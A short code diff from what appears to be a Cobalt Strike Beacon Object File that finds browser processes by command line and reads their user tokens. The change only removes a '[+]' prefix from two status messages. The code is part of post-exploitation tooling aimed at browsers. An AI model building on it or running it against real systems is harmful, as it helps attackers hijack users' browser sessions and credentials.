@@ -245,7 +245,7 @@ extern "C" {
                     {
                         if (CustomWcsStr(commandLine, flags) != 0)
                         {
-                            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found browser process: %d\n", pe32.th32ProcessID);
+                            BeaconPrintf(CALLBACK_OUTPUT, "Found browser process: %d\n", pe32.th32ProcessID);
                             GetTokenUser(hHandle);
                         }
                     }
@@ -294,7 +294,7 @@ extern "C" {
                     {
                         if (CustomWcsStr(commandLine, flags) != 0)
                         {
-                            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found browser process: %d\n", pe32.th32ProcessID);
+                            BeaconPrintf(CALLBACK_OUTPUT, "Found browser process: %d\n", pe32.th32ProcessID);
                             GetTokenUser(hHandle);
 
                             *pid = pe32.th32ProcessID;
